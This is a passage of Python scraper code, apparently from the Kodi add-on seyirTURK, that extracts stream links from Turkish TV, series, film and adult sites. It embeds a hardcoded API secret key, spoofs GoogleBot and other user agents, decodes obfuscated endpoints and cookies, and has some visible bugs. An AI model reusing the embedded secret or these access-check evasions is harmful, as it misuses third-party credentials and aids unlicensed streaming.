    host = 'https://securevideotoken.tmgrup.com.tr/webtv/secure?url=' + url1 + '&url2=' + url2
    if "atv.com" in url:
        data2= requests.get(host, headers = headers).text
    else:
        data2 = requests.get(host, headers = headers).text
    qualitylist =["m3u8","mp4"]
    videolist = re.findall('.*?Url":"(.*?)"', data2, re.IGNORECASE)
    if 'canli-yayin' in url:
        return videolist[qualitylist.index("m3u8")]
    return videolist[qualitylist.index("m3u8")]

def atvcanli(url):
    if "atv." in url:
        key = "atv"
    elif "minikacocuk" in url:
        key = "minikago_cocuk"
    elif "minikago"  in url:
        key = "minikago"
    headers = {'Referer':'https://www.atv.com.tr/', "User-Agent": UA}
    data44 = requests.get("https://www.atv.com.tr/canli-yayin", headers = headers).text
    url44 = re.findall('"(https://i.tmgrup.com.tr/videojs/js.*?)"',data44)[0]
    data = requests.get(url44, headers = headers).text
    try:
        url2, url1 = re.findall("'(https://trkvz.daioncdn.net/" + key + "/"+ key + ".m3u8\?app=).*?'\s*.*?:\s*'(.*?)'", data, re.DOTALL)[0]
    except:
        url2, url1 = re.findall("'(https://trkvz.daioncdn.net/" + key + "/"+ key + ".m3u8.*?\&app=).*?\\'\s*.*?:\s*\\\'(.*?)\\\'", data, re.DOTALL)[0]
    host = 'https://securevideotoken.tmgrup.com.tr/webtv/secure?url=' +  Quote_plus(url2 + url1)
    data2 = requests.get(host, headers = headers).text
    qualitylist =["m3u8","mp4"]
    videolist = re.findall('.*?Url":"(htt.*?)"', data2, re.IGNORECASE)

    if 'canli-yayin' in url:
        return videolist[0] + "#User-Agent=PostmanRuntime/7.47.1"
    return auto_select(qualitylist,videolist,qualitylist)

def dailymotion(url):
    url = url.replace("embed/", "").replace('video','player/metadata/video')
    page = fetch(url)
    js = json.loads(page)
    ff = js["qualities"]["auto"][0]["url"]
    if ver() < 19:
        ff = re.findall('EXT-X-STREAM-.*?\n(.*?)\n', fetch(ff))[-1]
    return ff

def fileru(url): 
    header={'Referer': 'https://dizilla.com'}
    url = url.replace('https:', '').replace('http:', '')
    url = 'http:' + url
    html = fetch(url, head=header)
    source_json = re.findall("getJSON\('(.*?)'", html)[0]
    source_link = 'http://fileru.net/' + source_json
    json_page = fetch(source_link, head=header)
    json_now = json.loads(json_page)
    for source in json_now["sources"]:
        qualitylist.append(source["label"])
        videolist.append(source["file"])
    return select(qualitylist,videolist)
    
def kanald(url):
    html = fetch(url)
    if 'canli-yayin' in url :
        link = re.findall('"([^"]*\.m3u8[^"]*)"', html)[0].replace('https://media.duhnet.tv','')
        return link + '#Referer=https://www.kanald.com.tr&User-Agent=' + UA
    else:
        link = re.findall('"contentUrl":"(.*?)"', html)[0]
        return link
    
def dizibox(url):
    kok = baseUrl(url)
    ref = url
    providers = []
    links = []
    page = requests.get(url, headers ={"User-Agent": UA})
    if "200" in page:
        page = page.text
    else:
        page = requests.get(url, headers = {"User-Agent": UA})
        if "200" in page:
            page = page.text
        else:
            page = fetch(url, head = {"User-Agent": UA})
    partial = re.findall('woca-linkpages-dd selectBox(.*?)/select', page, re.DOTALL)
    alternates = re.findall("(?:value='|href=')(.*?)'.*?>(.*?)<", partial[0])
    if len(alternates) > 1:
        for alternate in alternates:
            if "King" not in alternate[1] and "ngilizce" not in alternate[1]:
                providers.append(alternate[1])
                links.append(alternate[0])
        referer = '/'.join(url.split('/')[:-2]) + '/'
        res = select(providers,links,1)
        if res is not None and res != 'selection cancelled':
            apage = fetch(res, head={"User-Agent": UA,'Referer': referer})
        elif res == 'selection cancelled':
            return res
    else:
        apage = page
        res = 1
    try:
        if res is not None:
            url = re.findall('<iframe\s*src="(.*?)"', apage, re.IGNORECASE)[0]
            ref = re.findall('(^.*?/)player',url)[0]
            html = fetch(url, head={"User-Agent": UA,'Referer': ref})
        else:
            return None
    except:
        error(url)
    if 'mecnun.php' in url:
        link2 = re.findall('file:"(.*?)"', html)[0]
    elif 'moly.php' in url:
        page = Unquote(html)
        try:
            page_atob = re.findall('atob\(unescape\("(.*?)"',page)[0]
            page = decode_base64(page_atob)
        except:
            pass
        link2 = re.findall('iframe.*?src="(.*?)"',page)[0]
    elif 'indi.php' in url:
        link2 = re.findall('file:"(.*?)"',html)[0]
    elif 'haydi.php' in url:
        link2 = re.findall('frame.*?src="(.*?)"',html)[0]
    elif 'king.php' in url:
        headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
                "Referer": url}
        session = requests.Session()
        check = session.get(kok, headers=headers)
        page = session.get(url, headers = headers).text
        iframe = re.findall('<iframe.*?src="([^"]+)"', page)[0] +"/q/1"
        page = session.get(iframe, headers = headers).text
        link = requests.post(decode_base64(hash___), data = {"content": page, "ttl": 60})
        link = link.json()["link"]
        link2 = link + "#User-Agent=Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36&Referer=https://film.popcornvakti.net/embed/29354-68417ba03e1b1e053fc8e8fd"
    return link2

def chefkoch24(url):
    page = fetch(url)
    a = re.findall('source\s*src="(.*?)"\s*type=\'.*?\'\s*label\s*=\'(.*?)\'',page)
    for i in a:
        qualitylist.append(i[1])
        videolist.append(i[0].replace('https://','http://'))
    return select(qualitylist,videolist)
    
def haberturk(url):
    page = fetch(url)
    if "bloomberg" in url:
        page = requests.get("https://www.bloomberght.com/build/common/live-stream.js?v=116").text
        return re.findall('var\s*DE\s*=\s*"(.*?)"',page)[0].replace('\/','/')
    else:
        return re.findall('videoUrl\s*=\s*"(.*?)"',page)[0].replace('\/','/')
    
def dha(url):
    page = fetch(url)
    return re.findall("src:\s*'(.*?)'",page)[0].replace('\/','/')
    
def tv8(url):
    page = fetch(url)
    if "canli-yayin" in url:
        return re.findall('var videoUrl = "(.*?)"',page)[0]
    else:
        return re.findall('hls\s*:\s*"(.*?)"',page)[0]
    
def cnnteve2(url):
    page = fetch(url)
    kok = "/".join(re.findall('null,"Path":"(.*?)"',page)[0].split("/")[:3])
    if 'cnn' in url:
        media_id = re.findall('data-id="(.*?)"', page)[0]
        link = "https://www.cnnturk.com/action/media/" + madia_id + "?ad_type=embed-player"
        page = fetch(link)
        link = re.findall('"SecurePath"\s*:\s*"(.*?)"', page)[0].replace("cnnturknp","cnnturknp/track_4_1000").replace("\\u0026", "&")
        ref_use = '#Referer=https://www.cnnturk.com/&User-Agent=' + UA
        return kok + link + ref_use
    elif 'teve2' in url:
        link = re.findall('"contentUrl"\s*:\s*"(.*?)"',page)[0]
        ref_use = '#Referer=https://www.teve2.com.tr/canli-yayin&User-Agent=' + UA
        return link + ref_use
    

def tlc(url):
    page = fetch(url)
    if "canli-izle" in url:
        link = re.findall('(?:daionUrl|liveUrl)\s*(?:=|\:)\s*(?:\'|")(.*?)(?:\'|")',page)[0]
    else:
        if "tlctv" in url :
            pub_id = "20"
        else:
            pub_id = "27"
        ref_id = re.findall("referenceId\s*:\s*'(.*?)'", page)[0]
        link = fetch("https://dygvideo.dygdigital.com/api/redirect?PublisherId=" + pub_id + "&ReferenceId=" + ref_id + "&SecretKey=NtvApiSecret2014*", redir=1)
    return link
    
    
def kanal7(url):
    page = fetch(url)
    return re.findall("hls:\s*'(.*?)'",page)[0]
        
def kanal7dizi(url):
    page = fetch(url)
    url = re.findall('<iframe.*?src="(https://www.izle7.com/.*?)"', page)[0]
    page = fetch(url)
    kod = re.findall('play_video\s*=\s*"(.*?)"', page)[0]
    return 'https://www.dailymotion.com/embed/video/' + kod
        
def halktv(url):
    page = fetch(url)
    return re.findall('videoUrl\s*=\s*"(.*?)"',page)[0].replace('/embed/','/watch?v=')
    
def kralmuzik(url):
    page = fetch(url)
    return 'https://www.youtube.com/watch?v=' + re.findall("youtube.init\('(.*?)'",page)[0]
    
def numberone(url):
    page = fetch(url)
    return 'https:' + re.findall('<iframe.*?src="(.*?)"',page)[0]
    
def ahaber(url):
    a = 'https://securevideotoken.tmgrup.com.tr/webtv/secure?851521&url='
    if 'apara' in url:
        aa = 'http%3A%2F%2Ftrkvz-live.ercdn.net%2Faparahd%2Faparahd.m3u8'
    elif 'ahaber' in url:
        aa = 'https%3A%2F%2Ftrkvz-live.ercdn.net%2Fahaberhd%2Fahaberhd.m3u8'
    elif 'anews' in url:
        aa = 'http%3A%2F%2Ftrkvz-live.ercdn.net%2Fanewshd%2Fanewshd.m3u8'
    elif 'aspor' in url:
        aa = 'https%3A%2F%2Ftrkvz-live.ercdn.net%2Fasporhd%2Fasporhd.m3u8'
    elif 'a2tv' in url:
        aa = 'https%3A%2F%2Ftrkvz-live.ercdn.net%2Fa2tv%2Fa2tv.m3u8'
    referer = url
    url = a + aa
    content = fetch(url,head={'Referer': referer})
    return re.findall('"Url":"(.*?)"', content)[0]

def tv360(url):
    content = fetch(url)
    return re.findall('source\s*src="(.*?)"', content)[0]

def ucankus(url):
    content = fetch(url)
    return re.findall('<source\s*src="(.*?)"', content)[0]
 
def dreamturk(url):
    content = fetch(url)
    vid_id = re.findall('data-id\s*=\s*"(.*?)"', content)[0]
    url2 = 'https://www.dreamturk.com.tr/actions/content/media/' + vid_id
    content = fetch(url2)
    linkos = json.loads(content)
    return linkos["Media"]["Link"]["ServiceUrl"] +  linkos["Media"]["Link"]["SecurePath"] + "#User-Agent=" + UA
 
def tvem(url):
    content = fetch(url)
    url2 = re.findall('<div class="live-area">\s*\n.*?<script src="(.*?)"></script>', content)[0]
    url2 = 'http:' + url2
    content = fetch(url2)
    url3 = re.findall('yayincomtr4="(.*?)"', content)[0]
    content = fetch('http:' + url3)
    link = re.findall('#EXT-X-STREAM-INF.*?RESOLUTION=720x486\n(.*?)$', content)[0]
    return 'http://cdn-TVEM.yayin.com.tr/TVEM/TVEM/' + link

def ulusal(url):
    content = fetch(url)
    content = Unquote(content)
    return re.findall('<iframe.*?src="(.*?)"',content)[0].replace('https://www.youtube.com/embed/','https://www.youtube.com/watch?v=')

def kanalb(url):
    content = fetch(url)
    return "https://baskentaudiovideo.xyz/LiveApp/streams/" + re.findall('\?name=(.*?)"',content)[0] +".m3u8"

def ekoturk(url):
    content = fetch(url)
    return re.findall('<iframe.*?src="(.*?)\?',content)[0].replace('/embed/','/watch?v=')

def womantv(url):
    url = 'https://appie.vidpanel.com/wmtv/video/live'
    content = fetch(url)
    content = json.loads(content)
    return content["video"]

def tjk(url):
    url = 'https://www.tjk.org/TR/YarisSever/Static/Canli'
    content = fetch(url)
    return re.findall("hls\s*:\s*'(.*?)'", content)[0]

def yaban(url):
    content = fetch(url)
    url2 =re.findall('<iframe.*?src="(.*?)"', content)[0]
    if not 'http' in url2:
        url2 = 'http:' + url2
    content = fetch(url2)
    return re.findall('file\s*:\s*"(.*?)"', content)[0]
        
def videobin(url):
    page = fetch(url)
    links = re.findall('sources:\s*\["(.*?)","(.*?)"', page)
    for link in links[0]:
        if 'm3u8' in link:
            qualitylist.append('m3u8')
            videolist.append(link)
        if 'mp4' in link:
            qualitylist.append('mp4')
            videolist.append(link)
    return auto_select(qualitylist,videolist, ["m3u8","mp4"])
    
def gounlimited(url):
    page = fetch(url)
    link_code = re.findall("type\|(.*?)'.split", page)[0]
    link = link_code.split("|")
    return "https://" + link[1]+ ".gounlimited.to/" + link[0] + "/v.mp4#Referer=" + url
    
def saruch(url):
    vid_id = url.split('/')
    url = 'https://api.saruch.co/videos/' + vid_id[4] + '/stream?referrer=' +Quote(url)
    page = fetch(url)
    link = re.findall('"file":"(.*?)"', page)[0].replace('\/','/')
    de, en = re.findall('"de":"(.*?)","en":"(.*?)"', page)[0]
    link = link + '?de=' + de + '&en=' + en + '&.m3u8'
    showMessage("[COLOR orange][B]seyirTURK[/B][/COLOR]","[COLOR red][B]Kodi bu linki desteklemiyor![/B][/COLOR]",4000)
    link = None
    return link
     
def streamtheworld(url):
    page = fetch(url)
    ip = re.findall('<ip>(.*?)</ip>',page)[0]
    radyo = re.findall('<mount>(.*?)</mount>', page)[0]
    return 'https://' + ip + '/' + radyo +'.mp3'
        
def chaturbate(url):
    content = fetch(url)
    content = re.findall('hls_source\\\\u0022:\s*\\\\u0022(.*?)\\\\u0022', content)[0].replace('\\u002D','-')
    content1 = content.rsplit('/',1)[:-1][0]
    page = requests.get(content, headers= {"User-Agent": UA}).text
    try:
        link = re.findall('RESOLUTION=1280x720\n(.*?)$', page)[0]
    except:
        link = re.findall('RESOLUTION=1280x720\n(.*?m3u8)', page)[0]
    link = content1 + '/' + link
    return link
        
def volotv(url):
    page = fetch(url, head = {"User-Agent": "Cloudflare"})
    values = re.findall('const data = (.*?);',page, re.DOTALL)[0].replace(' ','').replace('\n','').replace("'",'"').replace(':','":').replace('{', '{"').replace(',', ',"').replace('\r','')
    headers = {"User-Agent": "Cloudflare", 'Referer':url, 'X-Requested-With': 'XMLHttpRequest','Content-Type': 'application/json'}
    url="https://api.canlitvvolo.com/api/tv/stream"
    the_page = fetch(url, head=headers ,data=json.dumps(json.loads(values)))
    js = json.loads(the_page)
    try:
        return re.findall("file:'(.*?)'", js["result"]["playerBodyEnd"])[0] + "#User-Agent=Cloudflare" 
    except:
        try:
            return re.findall('contentURL"\s*:\s*(.*?)"', js["result"]["playerBodyEnd"])[0] + "#User-Agent=Cloudflare" 
        except:
            return js.get("streamUrl") + "#User-Agent=Cloudflare"
        
def canliradyolar(url):
    content = fetch(url)
    url = re.findall('iframe\s*src="(.*?)"\s*name=', content)[0]
    content = fetch(url)
    return re.findall('source\s*src="(.*?)"',content)[0]
        
def ashemale(url):
    page = fetch(url)
    links_labels = re.findall('"src":"(.*?)","desc":"(.*?)",', page)
    for link in links_labels:
        qualitylist.append(link[1])
        videolist.append(link[0].replace("\\/","/"))
    return auto_select(qualitylist,videolist)
    
def pornhub(url):
    html = requests.get(url).text
    sources = []
    fvars = re.findall(r"var\s*flashvars_.*?=\s*(\{.*?);", html)
    if fvars:
        js = json.loads(fvars[0])
        js["defaultQuality"].sort(reverse=True)
        quals = [str(x) for x in js["defaultQuality"]]
        selection = auto_select(quals, quals, ["2160","1080","720","480","360","240","144"])
        for data in js["mediaDefinitions"]:
            if data["quality"] == selection:
                link = data["videoUrl"]
                break
    return link
    
def xvideos(url):
    page = fetch(url)
    links = re.findall(r'''setVideo(?:Url)?(?P<label>(?:HLS|High|Low))\(['"](?P<url>[^"']+)''',page)
    for link in links:
        qualitylist.append(link[0])
        videolist.append(link[1])
    return auto_select(qualitylist,videolist,["HLS","High","Low"])

def puh(url):
    a = fetch(url)
    b = re.findall('movieAssets":.*?_id":"(PUHU_.*?)"', a)[0]
    c ='https://dygvideo.dygdigital.com/api/video_info?akamai=true&PublisherId=29&ReferenceId=' + b + '&SecretKey=NtvApiSecret2014'
    d = fetch(c)
    e = json.loads(d)
    try:
        return e["data"]["flavors"]["0"]["file_url_1"] + "#User-Agent=" + UA
    except:
        return e["data"]["flavors"]["0"]["hls"] + "#User-Agent=" + UA

def teve2(url):
    a = fetch(url)
    b = re.findall('"contentUrl"\s*:\s*"(.*?)"', a)[0]
    return b

def milyontv(url):
    page = fetch(url)
    return re.findall("source\s*:\s*'(.*?)'", page)[0]

def dizilab(url):
    UA = "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36"
    linkler = []
    kok = '/'.join(url.split('/')[:3]) + '/'
    flag = True
    page = requests.get(url, headers = {"Referer": url, "User-Agent": UA}).text
    if '' in page:
        alts = re.findall(r"loadVideo\(\'(.*?)\'.*?\n.*?\n(.*?)\s*</a>",page)
        for alt in alts:
            if "VIP" not in alt[1]:
                linkler.append(alt[0])
                kaynaklar.append(alt[1].strip())
        res = select(kaynaklar,linkler,1)
        if res is not None and res != 'selection cancelled':
            video_id = res
        else:
            flag = False
    if flag:        
        url = kok + 'ajax'
        values = {'vid' : video_id,'tip' : '1','type' : 'loadVideo'}
        headers = {"User-Agent": UA, 'Referer': url,'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
        embed_page = requests.post(url, data=values, headers=headers).text

        try:
            url= re.findall('src=\\\\"(.*?)"', embed_page)[0].replace('\\','').replace("https://dizilab.com/", kok)
            del headers["content-type"]
            headers["Referer"] = url
            head = requests.head(url, headers=headers).headers
            cff = re.findall('_cff=(.*?);', str(head["set-cookie"]))[0]
            with requests.Session() as s:
                headers["Cookie"] =  "_cff=" + cff + ";"
                r = s.get(url,headers=headers)
                r = s.get(url, headers=headers)
                e_page = r.text.encode().decode()
            
            url2= re.findall('src="(.*?)"', e_page)[0].replace('\\','').replace(".me",".to")
            if "player" in url2:
                embed_page = requests.get(url2, headers= headers).text
                url2= re.findall('src="(.*?)"', embed_page)[0]
            if "ok.ru" in url2:
                return url2
            elif "dlx" in url2:
                url2 = url2.replace("dlx", "dbx")
                page = fetch(url2, head={"User-Agent": UA,'Referer': "https://dbx.molystream.org/"})
                return(ydd(page,url))
            elif "vidmoly" in url2:
                return url2
            page2 = fetch(url2)
            link = re.findall('file:"(.*?)"', page2)[0]
            if "urlset" in link:
                link = link + "#Referer=https://vidmoly.to/"
            return link
        except:
            try:
                linkler = []
                kaliteler = []
                json_page =json.loads(embed_page)
                for link in json_page["sources"]:
                    linkler.append(link["file"])
                    kaliteler.append(link["label"])
                res = select(kaliteler,linkler)
                if res is not None:
                    return res + '#Referer=' + kok + '&User-Agent=' + UA
                else:
                    return None
            except:
                if 'u kaynak attaya' in embed_page:
                    showMessage("[COLOR orange][B]seyirTURK[/B][/COLOR]","[COLOR orange][B]Medya kaynak sitede silinmiş!!![/B][/COLOR]")
    else:
        return res  
    
def radyohome(url):
    page = fetch(url)
    link = re.findall('"hls","url":"(.*?)"',page)[-1].replace('\/','/')
    return link

def streamtape(url):
    headers = {'Referer': 'https://streamtape.com/',
               'User-Agent': "UA"}
    page = requests.get(url, headers=headers).text
    
    src = re.findall(r'''ById\('.+?=\s*(["']//[^;<]+)''', page)
    parts = src[-1].replace("'", '"').split('+')
    src_url = ''
    for part in parts:
        p1 = re.findall(r'"([^"]*)', part)[0]
        p2 = 0
        if 'substring' in part:
            subs = re.findall(r'substring\((\d+)', part)
            for sub in subs:
                p2 += int(sub)
        src_url += p1[p2:]
    src_url += '&stream=1'
    return normalize_url(src_url) + '#Referer=https://streamtape.com/&User-Agent=' + UA

                      
def onlineradiobox(url):
    page = fetch(url)
    return re.findall('stream="(.*?)"',page)[0]

def dak7(url):
    page = fetch(url)
    if '7dak.com' in url:
        links = re.findall('source\s*src="(.*?)".*?size="(.*?)"', page)
        if links:
            for d in links:
                videolist.append(d[0])
                qualitylist.append(d[1])
        links = re.findall('source\s*src="(.*?)"', page)
        for d in links:
            videolist.append(d)
            qual = re.findall('quality=(.*?)\&',d)[0]
            qualitylist.append(qual)

    elif 'xnxx.com' in url:
        links = re.findall("setVideoUrl(Low|High)\('(.*?)'", page)
        if links:
            for d in links:
                videolist.append(d[1])
                qualitylist.append(d[0])
    return auto_select(qualitylist,videolist, ["1080","720","480","360"])
    
def dizigom(url):
    
    headers = {"Referer": url, "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"}
    p = fetch(url)
    second = re.findall('"contentUrl"\s*:\s*"(.*?)"',p)[0].replace('\/','/').replace("https://", "https://play.")
    referer = '/'.join(url.split('/')[:-2]) + '/'
    pp = requests.get(second, headers= headers).text
    try:
        data_uri = re.findall('data-uri="(.*?)"',pp)
        sources = re.findall('data-short="(.*?)"',pp)
        
        test = sources[0]
        for source in sources:
            kaynaklar.append(source)
        data_u = select(kaynaklar,data_uri,1)
        if data_u is not None and data_u != 'selection cancelled':
            if data_u == 'refresh':
                evall = re.findall('<script type=".*?text/javascript">(eval.*?)</script>',pp, re.DOTALL)[0]
                detect(evall)
                d = unpack(evall)
                try:
                    link = re.findall('"file"\s*:\s*"(.*?)"', d)[0].replace('\\\\/','/')
                except:
                    error(url)
            else:
                uri = data_u
                hashe = re.findall('video\/(.*?)$',uri)
                embeds_url = uri + '?do=getVideo'
                values = {'r' : referer,'s' : "",'hash' : hashe }
                d = fetch(embeds_url, data=values)
                link = re.findall('"file"\s*:\s*"(.*?)"', d)[0].replace('\/','/')
            return link  + "#Referer=" + referer
        else:
            return data_u
    except:
        evall = re.findall('>(eval\(.*?\))\s*<\/script>', pp)[0]
        detect(evall)
        d = unpack(evall)
    try:
        link = re.findall('"file"\s*:\s*"(.*?)"', d)[0].replace('\\\\/','/').replace('\\/','/')
        return link + "#Referer=" + referer
    except:
        error(url)

def dizilla_securedata(v1):
    v1 = Quote(v1)
    page = requests.post(root + "v2/parser/dizilla.php", data = "v1=" + v1, headers={'User-Agent': UA, 'bety': 'jughead', 'X-Requested-With': 'XMLHttpRequest'}).text.replace("\\","")
    return page

def dizilla_last(url):
    try:
        url = url.split("#")[0]
    except:
        pass
    url_raw = url.split("?l=")
    url = url_raw[0]
    language = url_raw[1] if "?l=" in url_raw else "0"
    page = requests.get(url_raw[0].replace("yabanci-dizi","yabancidizi")).text
    if 'secureData":' in page:
        secureData = re.findall('secureData":"(.*?)"', page)[0]
        page = decode_base64(secureData)
        if "pichive." not in page and "hotlinger." not in page and "contentx." not in page and "playru." not in page and "//four" not in page:
            page = dizilla_securedata(secureData)
    if "pichive." not in page and "hotlinger." not in page and "contentx." not in page and "playru." not in page and "//four" not in page:
        cookie = decode_base64(cid)
        page = requests.get(url, headers={"User-Agent": UA, "Cookie": cookie}).text
    try:
        link = re.findall(r'<iframe.*?src=(?:\\*|)"((?:(?!youtube).)*?)(?:\\*|)".*?</iframe>', page)
        
        if len(link)>1:
            for lin in link:
                if "contentx" in lin or "playru" in lin or "hotlinger" in lin or "pichive" in lin or "//four" in lin:
                    link[0] = lin
                    break
        link = normalize_url(link[0])
    except:
        link = requests.get('/'.join(root.split('/')[:-3]) + "/" + decrypt_message(get_alt) + Quote(url_raw[0])).text
    link = link + "#Referer=" + url + "?l=" + language
    return link

def filese(url):
    page = fetch(normalize_url(url), head={'Referer': url})
    regex = re.findall("getJSON\('(.*?)'",page)
    x = regex[0]
    url = "https://filese.me" + x.replace("'", "")
    page = fetch(url, head={'User-Agent': 'Mozilla/5.0 seyirTURK__KODI', 'Referer': url});
    qualitylist = re.findall('"label":"(.*?)"',page)
    videolist = re.findall('"file":"(.*?)"',page)
    res = select(qualitylist,videolist)
    if res is not None and res != 'selection cancelled':
        return res.replace('\\/','/') + '#Referer=https://filese.me&User-Agent=' + UA
    elif res == 'selection cancelled':
        return res


def contentx(url):
    url = url.replace("referer", "Referer")
    UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.81 Mobile Safari/537.36"
    host_name = "contentx"
    host = '/'.join(url.split('/')[:3]) + '/'
    kok = baseUrl(url)
    url_raw = url.split("?l=")
    url = url_raw[0]
    url_referer = url.split("#Referer=")
    page = fetch(url_referer[0], head={"User-Agent": UA, 'Referer': url_referer[1].replace("yabanci-dizi", "yabancidizi")})
    regex = re.findall('window.openPlayer\((.*?)\)',page)
    try:
        subs_raw = re.findall('"file"\s*:\s*"(.*?)".*?"lang"\s*:\s*"(.*?)"',regex[0])
        x = regex[0].split(',')[0].replace("'", "")
        url = host + "source2.php?v=" + x
        page = fetch(url ,head={'Referer': host})
        js = json.loads(page)
        for source in js["playlist"]:
            try:
                subs = []
                if (url_raw[1] == "1" and "Dublaj" in source["sources"][0]["title"]) or (url_raw[1] == "1" and "Orijinal" in source["sources"][0]["title"]):
                    link = source["sources"][0]["file"]
                elif (url_raw[1] == "0" and "Altyaz" in source["sources"][0]["title"]) or (url_raw[1] == "0" and "Orijinal" in source["sources"][0]["title"]):
                    link = source["sources"][0]["file"]    
                    subs_raw = sorted(
                        subs_raw,
                        key=lambda t: t[1],
                        reverse=True
                    )
                    for sub in subs_raw:
                        if "tr-forced" not in sub and "tr" == sub[1]:
                            subs.append(fixsub(fetch(sub[0].replace("\/","/"), head={"Referer": host, "User-Agent": "PostmanRuntime/7.48.0"}), "contentx"))
            except:
                link = source["sources"][0]["file"]
    except:
        
        subtitle_match = re.search(r'data:text/vtt;base64,([A-Za-z0-9+/=]+)', page)
        subtitle_text = ""
        if subtitle_match:
            subtitle_base64 = subtitle_match.group(1)
            subtitle_text = decode_base64(subtitle_base64)
            subs = [fixsub(subtitle_text, site = host_name)]
        link_match = re.search(r'"file"\s*:\s*"(.*?master\.php.*?)"', page)
        video_url = None
        if link_match:
            video_url = link_match.group(1).replace('\\/', '/')
            if video_url.startswith('/'):
                link = kok + video_url 

    page = fetch(link ,head={'User-Agent': UA,'Referer': host}).rstrip()
    link_video = page.split("\n")[-1] 
    link_video = link_video if link_video.startswith("http") else kok + link_video
    audio_links = re.findall('NAME=".*?LANGUAGE="(.*?)".*?URI="(.*?)"', page)
    if len(audio_links) == 0:
        video_page = fetch(link_video ,head={'User-Agent': UA,'Referer': host})
        audio_page =  ""
    else:
        link_audio = audio_links[0][1]
        for audio_link in audio_links:
            if url_raw[1] == "1" and audio_link[0].lower() == "tr":
                link_audio = audio_link[1] if audio_link[1].startswith("http") else kok + audio_link[1]
            elif  url_raw[1] == "0" and audio_link[0].lower() != "tr":
                link_audio = audio_link[1] if audio_link[1].startswith("http") else kok + audio_link[1]
        video_page = fetch(link_video ,head={'User-Agent': UA,'Referer': host})
        audio_page = fetch(link_audio ,head={'User-Agent': UA,'Referer': host})
    name = 'cont' + ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    if link is not None and link != 'selection cancelled':
        r = requests.post(root2 + "/kodi/" + host_name + "/online_combine.php", data ={"video_page": video_page, "audio_page": audio_page, "name": name}, headers={'User-Agent': UA, 'bety': 'jughead', 'X-Requested-With': 'XMLHttpRequest'}).text
        time.sleep(2)
        link = root2 + '/kodi/' + host_name +  '/play.php?name=' + name
        if len(subs) > 0:
            return [link + '#Referer=' + host + '&User-Agent=' + UA, subs]
        else:    
            return [link + '#Referer=' + host + '&User-Agent=' + UA + "&Accept=*/*",[]]
    elif link == 'selection cancelled':
        return link
    
    
def yabancidizi1(url):
    ref = url
    movie_or_tvseries = url
    kok = '/'.join(url.split('/')[:3]) + '/'
    if "?l" in url:
        seperate = url.split("?l=")
        url = seperate[0]
        l= int(seperate[1])
    hadigeneiyisiniz = '/'.join(secure("root").split("/")[:4])
    ua = secure("ybua")
    cook = secure("udys")
    page = requests.get(url, headers ={"User-Agent":ua, "Cookie":cook})
    if page.status_code == 200 and len(page.text) > 20:
        page = page.text
    else:
        page = requests.get(url, headers ={"User-Agent":UA, "Cookie":cook})
        if page.status_code == 200 and len(page.text) > 20:
            page = page.text
        else:
            page = fetch(url, head ={"User-Agent":UA})
            if len(page) < 20:
                page = requests.get(url)
                if page.status_code == 200 and len(page.text) > 20:
                    page = page.text
                else:
                    page = requests.get(url, headers ={"User-Agent":UA})
                    if page.status_code == 200 and len(page.text) > 20:
                        page = page.text
                    else:
                        page = requests.get(url, headers ={"User-Agent":UA, "Cookie": "udys=" + str(int(time.time()))}).text
    if page.strip() == "":
        page = requests.get("https://webcache.googleusercontent.com/search?q=cache:" + url).text
    alternatif_link_kodlari_partial = re.findall('series-tabs(.*?)mofycon',page,re.DOTALL)[0]
    alternatif_link_kodlari = re.findall('data-eid="(.*?)"\s*data-type="(.*?)"', alternatif_link_kodlari_partial)
    for b in alternatif_link_kodlari:
        if l == 1: lang=2
        else: lang=1
        if str(lang) == str(b[1]):
            episode1  = b[0]
    links = []
    sources = []
    values = {'lang' : lang,
              'episode' : episode1,
              'type' : 'langTab'}
    head = {"User-Agent": UA, "Referer": url, "content-type":"application/x-www-form-urlencoded; charset=UTF-8", "x-requested-with": "XMLHttpRequest","Cookie":cook}
    page = fetch(kok + 'ajax/service', data=values, head=head)
    if page.strip() == "":
        head = {"User-Agent": UA,"Referer": url,"content-type":"application/x-www-form-urlencoded; charset=UTF-8", "x-requested-with": "XMLHttpRequest"}
        
        page = fetch(kok + 'ajax/service', data=values, head=head)    
    bolum_embedleri = re.findall('data-hash=\\\\"(.*?)\\\\"\s*data-link=\\\\"(.*?)\\\\"', page)
    for bolum_embed in bolum_embedleri:
        values = {'hash' : bolum_embed[0].replace('\\','') ,
                  'link' : bolum_embed[1].replace('\\','') ,
                  'querytype' : 'alternate',
                  'type' : 'videoGet'}
        page1 = fetch(kok + 'ajax/service', data=values, head=head)
        link = re.findall('"api_iframe":\s*"(.*?)"', page1)[0].replace('\\','')
        provider = re.findall('/api/(.*?)/',link)[0].capitalize()
        if "Indi" not in provider:
            links.append(link)
            sources.append(provider)
    if len(sources)>0:
        url = select(sources,links,1)
        if url is not None and url != 'selection cancelled':
            referer = kok + 'dizi'
            page= fetch(url, head={"User-Agent": UA,'Referer': url, "x-requested-with": "XMLHttpRequest"})
            if 'api/cf' in url or 'api/indi' in url:
                link2 = re.findall('file:"(.*?)"', page)[0]
            elif 'api/moly' in url or 'api/ruplay' in url or 'api/saru' in url or 'api/goo' in url or 'api/superv' in url or 'api/drive' in url:
                aa = requests.get(url, headers = {"User-Agent": UA,'Referer': url, "x-requested-with": "XMLHttpRequest"}).text
                if "api/drive" not in url:
                    link2 = re.findall('<iframe.*?src=["\'](.*?)["\']', aa)[0]
                elif 'api/drive' in url:
                    link2 = ydd(aa, ref)
            return link2
    if url == 'selection cancelled':
        return url
 
def fullhdfilmizlesene(url):
    provider = []
    kok = '/'.join(url.split('/')[:3]) + '/'
    url1 = url.split('?l=')
    try:
        page = fetch(url1[0], head={"User-Agent": "GoogleBot"})
